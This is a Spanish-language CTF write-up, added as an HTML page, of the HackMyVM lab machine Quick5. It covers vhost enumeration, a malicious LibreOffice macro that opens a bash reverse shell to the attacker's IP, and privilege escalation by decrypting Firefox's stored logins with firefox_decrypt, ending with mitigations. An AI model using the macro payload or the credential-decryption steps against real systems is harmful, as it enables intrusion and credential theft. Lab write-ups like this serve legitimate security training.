@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Writeup de la máquina Quick5 de HackMyVM — Antoni Muñoz.">
+  <title>Quick5 — Writeup HackMyVM</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <a class="skip-link" href="#main">Saltar al contenido</a>
+
+  <header class="site-header">
+    <nav class="nav container" aria-label="Navegación principal">
+      <a class="brand" href="../index.html">
+        <span class="brand__prompt" aria-hidden="true">~$</span> antoni<span class="accent">.sec</span>
+      </a>
+      <button class="nav__toggle" aria-expanded="false" aria-controls="nav-menu">
+        <span class="nav__toggle-bar" aria-hidden="true"></span>
+        <span class="visually-hidden">Abrir menú</span>
+      </button>
+      <ul class="nav__menu" id="nav-menu">
+        <li><a href="../index.html">Inicio</a></li>
+        <li><a href="index.html" aria-current="page">Writeups</a></li>
+        <li><a href="../contacto/index.html">Contacto</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main id="main">
+    <div class="writeup-top container">
+      <a class="writeup-top__back" href="index.html">← Writeups</a>
+    </div>
+    <article class="prose container">
+    <h1>Writeup: Máquina Quick5 - HackMyVM</h1>
+    <p>En este writeup resolveremos la máquina <strong>Quick5</strong> de la plataforma HackMyVM. Empezando por la enumeración de una web con varios subdominios, conseguiremos acceso inicial aprovechándonos de un proceso de selección de personal en uno de los subdominios. La escalada de privilegios será a través de la recuperación de credenciales almacenadas por el navegador Firefox.</p>
+    <h2>Reconocimiento Inicial</h2>
+    <p>Empezamos haciendo un escaneo con <code>nmap</code> para descubrir los servicios expuestos:</p>
+    <pre><code class="language-bash">$&gt;  nmap -p- --open -sSCV -n -Pn 192.168.0.27 -oN tcpScan
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 84:e8:9c:b0:23:44:41:29:ae:7d:0b:0f:fe:88:08:c0 (ECDSA)
+|_  256 44:82:b7:78:47:02:7e:b4:40:c7:6b:fd:70:68:c1:42 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Quick Automative - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+    <p>Parece que el foothold tendrá que ser via web, vamos a centrarnos en el puerto 80. Acostumbro a usar <code>whatweb</code> para extraer tecnologías e información de cabecera:</p>
+    <pre><code class="language-bash">$&gt; whatweb http://192.168.0.27
+http://192.168.0.27 [200 OK] Apache[2.4.52], Bootstrap[4], Country[RESERVED][ZZ], Email[book@quick.hmv,info@quick.hmv,tech@quick.hmv], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.27], JQuery[3.4.1], Script, Title[Quick Automative - Home]
+</code></pre>
+    <p>Obtenemos varios correos (<code>book@quick.hmv</code>, <code>info@quick.hmv</code>, <code>tech@quick.hmv</code>) y confirmamos el dominio <code>quick.hmv</code>. Decido visitar la página web para echarle un ojo y hay dos cosas que me llaman la atención:</p>
+    <ul>
+    <li>Se muestran los nombres de 8 empleados, nos serviría para construir un diccionario de posibles usuarios </li>
+    <li>Existen dos formularios de contacto para enviar mensajes, donde podríamos probar inyecciones</li>
+    </ul>
+    <p>Haciendo hovering sobre algunos apartados de la web, puedo ver los subdominios <code>careers.quick.hmv</code> y <code>customer.quick.hmv</code>.  Parece que se hace uso de <strong>virtual hosting</strong>, por lo que podríamos fuzzear en busca de más subdominios. De momento incluyo <code>careers</code> y <code>customer</code> al <code>/etc/hosts</code>.</p>
+    <p>Al visitar <code>customer.quick.hmv</code>, se muestra el siguiente mensaje:</p>
+    <blockquote>
+    <p>"This page is under maintenance due to a security incident."</p>
+    </blockquote>
+    <p>Enseguida se me ocurre que puede existir un backdoor que nos permita el foothold inicial. Vamos a seguir con el reconocimiento, como hemos dicho antes, enumerando subdominios (realmente vhosts) con <code>gobuster</code>:</p>
+    <pre><code class="language-bash">$&gt; gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://quick.hmv -r --append-domain
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+careers.quick.hmv Status: 200 [Size: 13819]
+customer.quick.hmv Status: 200 [Size: 2258]
+employee.quick.hmv Status: 200 [Size: 2258]
+===============================================================
+Finished
+===============================================================
+</code></pre>
+    <p>Aparece un nuevo subdominio, <code>employee.quick.hmv</code>. Lo añado a <code>/etc/hosts</code>, pero al visitar la web muestra el mismo contenido que <code>customer.quick.hmv</code>.</p>
+    <p>Sigo trasteando la web y veo que en <code>careers.quick.hmv</code>podemos aplicar a un puesto de trabajo. El formulario pide adjuntar dos archivos (currículum y carta), que pueden estar en formato <code>.odt</code> o <code>.pdf</code>. Podemos asumir que habrá alguien de la empresa revisando estos archivos, así que esto es lo mejor que tenemos hasta ahora como posible vector de entrada.</p>
+    <h2>Acceso inicial</h2>
+    <p>Hago un poco de investigación y encuentro el siguiente <a href="https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d">recurso</a> que explica cómo crear una macro maliciosa en un archivo <code>.odt</code> que nos envíe una reverse shell.</p>
+    <p>Abrimos LibreOffice, escribimos cualquier cosa y guardamos el documento. Después creamos una macro para el documento con el siguiente contenido:</p>
+    <pre><code class="language-basic">Sub Main
+    shell("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.43/443 2&gt;&amp;1'")
+End Sub
+</code></pre>
+    <p>Configuramos la macro para se ejecute automáticamente al abrir el archivo y guardamos el documento. Ahora simplemente preparamos el listener en nuestra máquina atacante y subimos el archivo malicioso. Tras unos momentos, obtenemos una shell como <code>andrew</code>, lo que nos permite leer la primera flag.</p>
+    <h2>Escalada de Privilegios</h2>
+    <p>Haciendo enumeración manual rutinaria del sistema, lanzo </p>
+    <pre><code class="language-bash">grep -r "pass" / 2&gt;/dev/null
+</code></pre>
+    <p>pero lo cancelo al momento porque me arroja muchísimo output. Aún así, al principio del output veo algo que me llama la atención:</p>
+    <p><img alt="Captura de logins.json" src="src/quick2.jpg"></p>
+    <p>Un archivo <code>/home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json</code> que contiene los campos <code>encryptedUsername</code> y <code>encryptedPassword</code> entre otros. Pruebo con <code>hashid</code> y <code>hashcat</code> sin ningún resultado, así que decido buscar en internet "firefox decrypt", lo que rápidamente me lleva al siguiente <a href="https://github.com/unode/firefox_decrypt/">repo</a>. </p>
+    <p>Al ejecutar la herramienta directamente, no encuentra <code>profiles.ini</code> en la ruta habitual (<code>~/.mozilla/firefox</code>). Buscando en el sistema los archivos <code>.ini</code> filtrando por el usuario <code>andrew</code>, localizamos la ruta real (resulta que Firefox está instalado vía Snap):</p>
+    <pre><code class="language-bash">/home/andrew/snap/firefox/common/.mozilla/firefox/profiles.ini
+</code></pre>
+    <p>Ejecutamos ahora con la ruta correcta:</p>
+    <pre><code class="language-bash">$&gt; ./firefox_decrypt.py /home/andrew/snap/firefox/common/.mozilla/firefox
+
+Website:   http://employee.quick.hmv
+Username: 'andrew.speed@quick.hmv'
+Password: 'SuperSecretPassword'
+</code></pre>
+    <p>Probamos la contraseña para <code>root</code> y funciona! Máquina rooteada, obtenemos la flag final.</p>
+    <h2>Detección y Mitigación</h2>
+    <ul>
+    <li>Mensaje de mantenimiento revelando un incidente de seguridad previo — no exponer problemas de seguridad en avisos públicos</li>
+    <li>Formulario de subida de documentos sin sandboxing — abrir archivos externos en un entorno aislado, nunca en un sistema con acceso a datos internos</li>
+    <li>Macros habilitadas por defecto en documentos externos — deshabilitarlas o gestionar el documento de alguna forma para evitar la ejecución</li>
+    <li>Credenciales de navegador (<code>logins.json</code>) almacenadas — activar el cifrado adicional que ofrece Firefox (contraseña maestra)</li>
+    <li>Reutilización de contraseñas (root)</li>
+    </ul>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <p>Antoni Muñoz · Junior Pentester</p>
+      <p class="footer-inner__meta"></p>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
